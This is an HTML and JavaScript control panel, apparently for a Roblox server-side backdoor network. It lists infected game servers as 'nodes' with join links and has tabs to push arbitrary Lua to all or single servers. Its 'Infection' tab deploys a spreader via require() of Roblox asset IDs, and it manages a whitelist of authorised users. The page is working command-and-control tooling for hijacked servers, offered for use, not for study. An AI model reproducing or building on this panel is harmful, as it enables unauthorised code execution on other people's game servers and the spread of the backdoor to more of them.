<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Nexus  | Classic</title>
    <style>
        :root { --apple-blue: #0071e3; --bg: #000; }
        body { margin: 0; background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; overflow: hidden; }
        
        .header { position: fixed; top: 0; width: 100%; height: 44px; background: rgba(0,0,0,0.8); backdrop-filter: blur(20px); border-bottom: 1px solid #333; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; box-sizing: border-box; z-index: 1000; }
        .nav { display: flex; gap: 12px; }
        .nav-btn { background: none; border: none; color: #86868b; cursor: pointer; font-size: 11px; padding: 5px 10px; border-radius: 5px; transition: 0.2s; }
        .nav-btn.active { color: #fff; background: rgba(255,255,255,0.1); font-weight: 600; }

        .container { display: flex; align-items: center; justify-content: center; height: 100vh; }
        .card { background: #1c1c1e; border-radius: 18px; width: 520px; padding: 25px; border: 1px solid #333; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
        
        h2 { margin: 0 0 15px 0; font-size: 20px; }
        input, textarea, select { width: 100%; border-radius: 8px; border: 1px solid #424245; background: #000; color: #fff; padding: 10px; margin-bottom: 10px; box-sizing: border-box; outline: none; font-size: 13px; }
        textarea { font-family: 'Courier New', monospace; resize: none; }
        
        .btn-main { background: var(--apple-blue); color: #fff; border: none; border-radius: 8px; padding: 12px; width: 100%; font-weight: 600; cursor: pointer; }
        .row-btns { display: flex; gap: 5px; margin-bottom: 10px; }
        .rh-pill { background: #333; color: #fff; border: none; padding: 5px 10px; border-radius: 12px; font-size: 10px; cursor: pointer; }

        .tab-content { display: none; }
        .tab-content.active { display: block; }

        /* Node List Fix */
        .node-box { background: #0b0b0c; border-radius: 10px; height: 200px; overflow-y: auto; border: 1px solid #333; }
        .node-item { padding: 12px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
        .game-info { display: flex; flex-direction: column; gap: 2px; }
        .game-name { font-size: 13px; font-weight: 600; color: #fff; }
        .job-id { font-family: monospace; font-size: 9px; color: #636366; }
        .join-link { background: #fff; color: #000; text-decoration: none; font-size: 10px; font-weight: 700; padding: 4px 10px; border-radius: 12px; }
    </style>
</head>
<body onclick="startAudio()">
    <audio id="bgMusic" loop src="https://cdn.discordapp.com/attachments/1459510270870421546/1489905086250352772/Wont_Stop_Us_-_StacyBurke92_g00byd0lan_KLICKAUD.mp3?ex=69d21dbd&is=69d0cc3d&hm=f7812e208edafbe0c5f70e2359dc893b9c6477033ae2989720e977ab36a15b8a&"></audio>

    <div class="header">
        <div style="font-weight:700; letter-spacing: -0.5px;"> NEXUS</div>
        <div class="nav">
            <button class="nav-btn active" onclick="showTab('mass', this)">Mass</button>
            <button class="nav-tab nav-btn" onclick="showTab('single', this)">Single</button>
            <button class="nav-tab nav-btn" onclick="showTab('inf', this)">Infection</button>
            <button class="nav-tab nav-btn" onclick="showTab('wl', this)">Whitelist</button>
            <button class="nav-tab nav-btn" onclick="showTab('nodes', this)">Nodes</button>
        </div>
        <div id="clock" style="font-size:10px; color:#86868b;"></div>
    </div>

    <div class="container">
        <div class="card">
            <div id="mass" class="tab-content active">
                <h2>Mass Execution</h2>
                <div class="row-btns">
                    <button class="rh-pill" onclick="fill(1, 'm_lua')">Last Rig</button>
                    <button class="rh-pill" onclick="fill(3, 'm_lua')">Darius (OP)</button>
                </div>
                <input type="password" id="m_pw" placeholder="Admin Password">
                <textarea id="m_lua" rows="7" placeholder="-- Global Lua"></textarea>
                <button class="btn-main" onclick="send('mass')">Execute All</button>
            </div>

            <div id="single" class="tab-content">
                <h2>Single Execution</h2>
                <select id="target_id"><option value="">Waiting for nodes...</option></select>
                <div class="row-btns">
                    <button class="rh-pill" onclick="fill(3, 's_lua')">Darius (OP)</button>
                </div>
                <input type="password" id="s_pw" placeholder="Admin Password">
                <textarea id="s_lua" rows="6" placeholder="-- Target Lua"></textarea>
                <button class="btn-main" onclick="send('single')">Execute Target</button>
            </div>

            <div id="inf" class="tab-content">
                <h2>Infection</h2>
                <input type="password" id="i_pw" placeholder="Password">
                <textarea id="i_lua" rows="8">require(127445614272366).op("Darius")</textarea>
                <button class="btn-main" onclick="send('inf')">Deploy Spreader</button>
            </div>

            <div id="wl" class="tab-content">
                <h2>Whitelist Manager</h2>
                <input type="text" id="wid" placeholder="Roblox UserID">
                <button class="btn-main" onclick="wlu('add')">Authorize ID</button>
                <button class="btn-main" style="background:#222; margin-top:8px;" onclick="wlu('remove')">Revoke ID</button>
            </div>

            <div id="nodes" class="tab-content">
                <h2>Active Nodes</h2>
                <div id="node_list" class="node-box"></div>
            </div>
        </div>
    </div>

    <script>
        const audio = document.getElementById('bgMusic');
        let unlocked = false;

        function startAudio() {
            if(!unlocked) {
                audio.play().then(() => { unlocked = true; }).catch(() => {});
            }
        }

        function showTab(id, btn) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.nav-tab, .nav-btn').forEach(b => b.classList.remove('active'));
            const target = document.getElementById(id);
            if(target) target.classList.add('active');
            if(btn) btn.classList.add('active');
        }

        function fill(type, boxId) {
            const box = document.getElementById(boxId);
            if(type === 1) box.value = `require(132155655397653)("Darius")`;
            if(type === 3) box.value = `require(127445614272366).op("Darius")`;
        }

        async function send(tab) {
            const lua = document.querySelector(`#${tab} textarea`).value;
            const pw = document.querySelector(`#${tab} input`).value;
            const tid = tab === 'single' ? document.getElementById('target_id').value : null;
            const res = await fetch('/push-lua', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({lua, password: pw, targetId: tid})
            });
            alert(res.ok ? "✓ Deployed" : "✕ Failed");
        }

        async function wlu(a){
            const i=document.getElementById('wid').value;
            await fetch('/update-whitelist',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:i,action:a})});
            alert("Updated");
        }

        async function update() {
            try {
                const res = await fetch('/get-games?t=' + Date.now());
                const data = await res.json();
                const list = document.getElementById('node_list');
                const sel = document.getElementById('target_id');
                const keys = Object.keys(data);

                if(sel) sel.innerHTML = keys.map(k => `<option value="${k}">${data[k].name}</option>`).join('') || '<option value="">No Servers Found</option>';
                if(list) list.innerHTML = keys.map(k => `
                    <div class="node-item">
                        <div class="game-info">
                            <div class="game-name">${data[k].name}</div>
                            <div class="job-id">JOBID: ${k}</div>
                        </div>
                        <a href="roblox://placeId=${data[k].placeId}&gameInstanceId=${k}" class="join-link">JOIN</a>
                    </div>`).join('') || '<div style="padding:40px; color:#444; text-align:center; font-size:12px;">Scanning for active servers...</div>';
            } catch(e) {}
        }

        setInterval(update, 5000);
        setInterval(() => { document.getElementById('clock').innerText = new Date().toLocaleTimeString(); }, 1000);
        window.onload = update;
    </script>
</body>
</html>
